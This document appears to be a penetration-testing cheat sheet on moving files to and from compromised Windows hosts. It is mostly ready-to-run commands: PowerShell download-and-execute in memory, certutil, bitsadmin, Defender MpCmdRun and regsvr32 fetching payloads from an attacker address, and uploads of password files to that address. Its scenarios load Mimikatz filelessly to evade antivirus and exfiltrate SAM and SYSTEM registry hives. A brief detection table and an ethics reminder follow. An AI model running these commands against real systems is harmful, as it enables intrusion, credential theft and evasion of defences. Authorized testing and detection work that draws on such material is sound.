# 🪟 Windows File Transfer Methods — Complete Guide

## 📖 Why Windows File Transfer Matters

When you compromise a Windows target during a pentest, you'll often need to:

* **Upload** tools (Mimikatz, SharpHound, WinPEAS, etc.)
* **Download** loot (SAM database, NTDS.dit, config files)
* Do it **quietly** without triggering antivirus

Windows has MANY built-in tools that can transfer files — no extra software needed!

```text
  ATTACKER                                TARGET (Windows)
  ┌──────────┐                           ┌──────────────────┐
  │          │   Upload tools ────────▶  │  Built-in tools: │
  │  Kali /  │                           │  • PowerShell    │
  │  Linux   │   Download loot ◀──────   │  • Certutil      │
  │          │                           │  • Bitsadmin     │
  └──────────┘                           │  • MpCmdRun      │
                                         │  • Expand        │
                                         │  • Copy          │
                                         └──────────────────┘
```

---

## 1️⃣ PowerShell Methods (Most Versatile)

PowerShell is the **#1 tool** for Windows file transfers.

---

### Invoke-WebRequest (iwr)

```powershell
# Download file
Invoke-WebRequest -Uri "http://10.10.14.5/tool.exe" -OutFile "C:\Temp\tool.exe"

# Short alias
iwr http://10.10.14.5/tool.exe -o C:\Temp\tool.exe

# Ignore SSL errors (self-signed certs)
iwr https://10.10.14.5/tool.exe -o C:\Temp\tool.exe -SkipCertificateCheck
```

---

### WebClient.DownloadFile

```powershell
# Download binary file
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/tool.exe','C:\Temp\tool.exe')
```

---

### WebClient.DownloadString (Fileless — Runs in Memory!)

```powershell
# Download and execute PowerShell script in memory
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1')

# Same thing, different syntax
$code = (New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')
Invoke-Expression $code
```

**Why is this powerful?**

```text
Normal download:  File → Disk → AV scans it → DETECTED ❌
Fileless:         File → Memory → Executes → NO FILE ON DISK ✅

Antivirus scans files on disk. If the file never touches disk,
traditional AV can't detect it!
```

---

### WebClient.DownloadData (Binary in Memory)

```powershell
# Download binary into memory
$bytes = (New-Object Net.WebClient).DownloadData('http://10.10.14.5/tool.exe')

# Load into current process
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Execute
$assembly.EntryPoint.Invoke($null, @(,@()))
```

---

### Invoke-RestMethod

```powershell
# Download content
$data = Invoke-RestMethod -Uri "http://10.10.14.5/tool.exe"

# Download and save
Invoke-RestMethod -Uri "http://10.10.14.5/file.txt" -OutFile "C:\Temp\file.txt"
```

---

### PowerShell Upload (Sending Files Back to Attacker)

**Attacker — Set up upload server:**

```bash
pip install uploadserver
python3 -m uploadserver 80
```

**Target — Upload file:**

```powershell
# Method 1: Invoke-WebRequest POST
$file = Get-Content C:\Users\admin\Desktop\passwords.txt -Raw
Invoke-WebRequest -Uri http://10.10.14.5/upload -Method POST -Body $file

# Method 2: Invoke-RestMethod
Invoke-RestMethod -Uri http://10.10.14.5/upload -Method POST -InFile C:\data.zip

# Method 3: WebClient upload
(New-Object Net.WebClient).UploadFile('http://10.10.14.5/upload','C:\data.zip')
```

---

## 2️⃣ Certutil (Built-in Windows Tool)

**Certutil** is meant for certificate management but can download files. Very useful when PowerShell is blocked!

```cmd
:: Download a file
certutil -urlcache -split -f http://10.10.14.5/tool.exe C:\Temp\tool.exe

:: Download and decode Base64 file
certutil -urlcache -split -f http://10.10.14.5/encoded.txt C:\Temp\encoded.txt
certutil -decode C:\Temp\encoded.txt C:\Temp\decoded.exe
```

**Bonus — Encode/Decode files with Certutil:**

```cmd
:: Encode file to Base64 (on target)
certutil -encode C:\Temp\secret.exe C:\Temp\encoded.txt

:: Decode Base64 back to file
certutil -decode C:\Temp\encoded.txt C:\Temp\secret.exe
```

> ⚠ **Detection:** Modern EDRs flag `certutil -urlcache`. Use as fallback when PowerShell is blocked.

---

## 3️⃣ Bitsadmin (Background Intelligent Transfer)

**Bitsadmin** is a Windows service for background downloads. It's built-in and works in old Windows versions.

```cmd
:: Download file
bitsadmin /transfer myJob /download /priority high http://10.10.14.5/tool.exe C:\Temp\tool.exe

:: Check download progress
bitsadmin /info myJob /verbose
```

> Bitsadmin runs as a background service — it downloads even if the user logs off.

---

## 4️⃣ Windows Defender (MpCmdRun) — Sneaky!

Windows Defender itself has a download feature meant for signature updates. Attackers abuse it!

```cmd
:: Download file using Windows Defender
MpCmdRun.exe -DownloadFile -url http://10.10.14.5/tool.exe -path C:\Temp\tool.exe
```

> 🤫 This is ironic — using the **antivirus** to download your **hacking tool**.

---

## 5️⃣ Expand (Extract from CAB)

If you can get a `.cab` file to the target:

```cmd
:: Extract from CAB file
expand \\10.10.14.5\share\tool.cab C:\Temp\tool.exe
```

---

## 6️⃣ Copy / Xcopy / Robocopy (SMB-based)

If you have **SMB access** (port 445):

```cmd
:: Copy from SMB share
copy \\10.10.14.5\share\tool.exe C:\Temp\tool.exe

:: Xcopy (with subdirectories)
xcopy \\10.10.14.5\share\* C:\Temp\ /E /Y

:: Robocopy (enterprise-grade copy)
robocopy \\10.10.14.5\share C:\Temp /E
```

---

## 7️⃣ WMIC (Windows Management Instrumentation)

```cmd
:: Download and execute
wmic process call create "cmd /c certutil -urlcache -split -f http://10.10.14.5/tool.exe C:\Temp\tool.exe"
```

---

## 8️⃣ Esentutl (Jet Database Utility)

Another sneaky built-in tool:

```cmd
:: Copy file from UNC path
esentutl.exe /y \\10.10.14.5\share\tool.exe /d C:\Temp\tool.exe /o
```

---

## 9️⃣ Regsvr32 (For DLL execution)

```cmd
:: Download and execute a DLL/SCT file
regsvr32 /s /n /u /i:http://10.10.14.5/payload.sct scrobj.dll
```

---

## 🔟 desktopimgdownldr (Undetected by some EDRs)

```cmd
:: Using desktopimgdownldr to download
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://10.10.14.5/tool.exe /eventName:desktopimgdownldr
```

---

## 🔥 Realistic Attack Scenarios

---

### Scenario 1: PowerShell Blocked — Use Certutil

```text
TARGET: Windows Server 2019
PROBLEM: PowerShell execution policy is restricted

SOLUTION:
┌──────────────────────────────────────┐
│ ATTACKER:                            │
│ python3 -m http.server 80           │
└──────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────┐
│ TARGET (cmd.exe — no PowerShell):                                │
│                                                                  │
│ certutil -urlcache -split -f http://10.10.14.5/winpeas.exe      │
│     C:\Temp\winpeas.exe                                          │
│                                                                  │
│ C:\Temp\winpeas.exe                                              │
└──────────────────────────────────────────────────────────────────┘
```

---

### Scenario 2: Antivirus Active — Use Fileless Execution

```text
TARGET: Windows 10 with Defender
PROBLEM: Defender deletes mimikatz.exe on download

SOLUTION: Load script in memory — never touches disk

┌──────────────────────────────────────────────────────────────────┐
│ TARGET (PowerShell):                                             │
│                                                                  │
│ IEX (New-Object Net.WebClient).DownloadString(                   │
│   'http://10.10.14.5/Invoke-Mimikatz.ps1')                      │
│                                                                  │
│ Invoke-Mimikatz -DumpCreds                                       │
│                                                                  │
│ # Script ran in memory — no file for AV to scan!                 │
└──────────────────────────────────────────────────────────────────┘
```

---

### Scenario 3: Exfiltrate SAM Database

```text
TARGET: You dumped SAM and SYSTEM from registry
NEED: Get these files back to attacker

┌──────────────────────────────────────────────────────────────────┐
│ TARGET:                                                          │
│ reg save HKLM\SAM C:\Temp\SAM                                   │
│ reg save HKLM\SYSTEM C:\Temp\SYSTEM                             │
│                                                                  │
│ ATTACKER:                                                        │
│ impacket-smbserver share $(pwd) -smb2support                     │
│                                                                  │
│ TARGET:                                                          │
│ copy C:\Temp\SAM \\10.10.14.5\share\SAM                         │
│ copy C:\Temp\SYSTEM \\10.10.14.5\share\SYSTEM                   │
│                                                                  │
│ ATTACKER:                                                        │
│ secretsdump.py -sam SAM -system SYSTEM LOCAL                     │
└──────────────────────────────────────────────────────────────────┘
```

---

## 📊 Windows Transfer Methods Comparison

| Method | Requires PS | Fileless | AV Risk | Stealthiness |
| --- | --- | --- | --- | --- |
| PowerShell IWR | ✅ | ❌ | Medium | ⭐⭐⭐ |
| PS DownloadString | ✅ | ✅ | Low | ⭐⭐⭐⭐ |
| Certutil | ❌ | ❌ | High | ⭐⭐ |
| Bitsadmin | ❌ | ❌ | Medium | ⭐⭐⭐ |
| MpCmdRun | ❌ | ❌ | Low | ⭐⭐⭐⭐ |
| SMB Copy | ❌ | ❌ | Low | ⭐⭐⭐ |
| WMIC | ❌ | ❌ | Medium | ⭐⭐⭐ |
| Esentutl | ❌ | ❌ | Low | ⭐⭐⭐⭐ |

---

## 🛡 Blue Team — Detection

| Tool Abused | Event to Monitor | Detection Tip |
| --- | --- | --- |
| PowerShell | Event 4104 (Script Block) | Look for `DownloadString`, `IWR` |
| Certutil | Process creation | Flag `certutil -urlcache` |
| Bitsadmin | BITS event logs | Unusual background transfers |
| MpCmdRun | Process creation | `-DownloadFile` flag |
| SMB Copy | Event 5140/5145 | Unusual share access |

---

## ⚠ Ethical Reminder

* ✅ Only use on systems you have **written authorization** to test
* ✅ Practice in your own lab
* ❌ Never exfiltrate data without permission
